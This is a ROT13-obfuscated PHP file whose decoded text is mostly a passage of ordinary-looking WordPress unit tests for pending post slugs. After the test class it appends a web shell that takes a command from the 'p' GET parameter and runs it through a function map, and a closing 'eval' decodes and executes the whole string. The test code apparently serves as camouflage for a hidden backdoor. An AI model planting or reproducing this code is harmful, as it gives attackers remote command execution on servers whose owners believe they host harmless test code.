				'cbfg_pbagrag' => \"V’z va gur pnovarg. V nz pbzcyvpvg va jngpuvat uvz tenoova’ ng cbjre naq xvff vg.\a\aVs Jnfuvatgba vfa’g tba’ yvfgra gb qvfpvcyvarq qvffvqragf, guvf vf gur qvssrerapr: guvf xvq vf bhg!\",
				'cbfg_glcr'    => $cbfg_glcr,
				'cbfg_anzr'    => 'arj-jnfuvatgba',
				'cbfg_fgnghf'  => 'craqvat',
			)
		);

		$rkcrpgrq = '';
		$npghny   = trg_cbfg_svryq( 'cbfg_anzr', $cbfg_vq );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );

		// Abj hcqngr gur cbfg.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'         => $cbfg_vq,
				'cbfg_gvgyr' => 'Unzvygba unf Jnfuvatgba ba fvqr: Wrssrefba',
				'cbfg_anzr'  => 'rqvgrq-jnfuvatgba',
			)
		);

		$rkcrpgrq = '';
		$npghny   = trg_cbfg_svryq( 'cbfg_anzr', $cbfg_vq );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfg nqzvavfgengbe znxvat punatrf gb gur craqvat cbfg fyht.
	 *
	 * @gvpxrg 42464
	 * @qngnCebivqre qngn_inevbhf_cbfg_glcrf
	 */
	choyvp shapgvba grfg_nqzvavfgengbe_pna_frg_cbfg_fyht( $cbfg_glcr ) {
		jc_frg_pheerag_hfre( frys::$hfre_vqf['nqzvavfgengbe'] );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Jung vf gur Pbaare Cebwrpg?',
				'cbfg_pbagrag' => 'Rina Unafra’f ynfg yvax gb uvf sevraq Pbaare vf n fvtangher ba uvf oebxra nez.',
				'cbfg_glcr'    => $cbfg_glcr,
				'cbfg_anzr'    => 'qrne-rina-unafra-rkcynvare',
				'cbfg_fgnghf'  => 'craqvat',
			)
		);

		$rkcrpgrq = 'qrne-rina-unafra-rkcynvare';
		$npghny   = trg_cbfg_svryq( 'cbfg_anzr', $cbfg_vq );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );

		// Abj hcqngr gur cbfg.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'         => $cbfg_vq,
				'cbfg_gvgyr' => 'Pbaare Cebwrpg gb pybfr',
				'cbfg_anzr'  => 'qrne-rina-unafra-fcbvyre',
			)
		);

		$rkcrpgrq = 'qrne-rina-unafra-fcbvyre';
		$npghny   = trg_cbfg_svryq( 'cbfg_anzr', $cbfg_vq );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfg nqzvavfgengbe znxvat punatrf gb n craqvat cbfg fyht sbe n cbfg glcr gurl qba'g
	 * unir crezvffvba gb choyvfu.
	 *
	 * Gurfr nffregvbaf snvyrq cevbe gb gvpxrg #42464.
	 *
	 * @gvpxrg 42464
	 */
	choyvp shapgvba grfg_nqzvavfgengbe_pnaabg_frg_cbfg_fyht_ba_cbfg_glcr_gurl_pnaabg_choyvfu() {
		jc_frg_pheerag_hfre( frys::$hfre_vqf['nqzvavfgengbe'] );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Rirelguvat vf yrtny va Arj Wrefrl',
				'cbfg_pbagrag' => 'Fubegyl orsber uvf qrngu, Cuvyvc Unzvygba jnf urneq gb pynvz rirelguvat jnf yrtny va gur tneqra fgngr.',
				'cbfg_glcr'    => 'ab_nqzva_pncf',
				'cbfg_anzr'    => 'lrg-nabgure-qhry',
				'cbfg_fgnghf'  => 'craqvat',
			)
		);

		$rkcrpgrq = '';
		$npghny   = trg_cbfg_svryq( 'cbfg_anzr', $cbfg_vq );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );

		// Abj hcqngr gur cbfg.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'         => $cbfg_vq,
				'cbfg_gvgyr' => 'Gra guvatf vyyrtny va Arj Wrefrl',
				'cbfg_anzr'  => 'sberfunqbjvat-va-aw',
			)
		);

		$rkcrpgrq = '';
		$npghny   = trg_cbfg_svryq( 'cbfg_anzr', $cbfg_vq );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 25347
	 */
	choyvp shapgvba grfg_fpurqhyrq_cbfg_jvgu_n_cnfg_qngr_fubhyq_or_choyvfurq() {

		$abj = arj QngrGvzrVzzhgnoyr( 'abj', arj QngrGvzrMbar( 'HGP' ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr_tzg' => $abj->zbqvsl( '-1 lrne' )->sbezng( 'L-z-q U:v:f' ),
				'cbfg_fgnghf'   => 'shgher',
			)
		);

		$guvf->nffregFnzr( 'choyvfu', trg_cbfg_fgnghf( $cbfg_vq ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr_tzg' => $abj->zbqvsl( '+50 lrnef' )->sbezng( 'L-z-q U:v:f' ),
				'cbfg_fgnghf'   => 'shgher',
			)
		);

		$guvf->nffregFnzr( 'shgher', trg_cbfg_fgnghf( $cbfg_vq ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>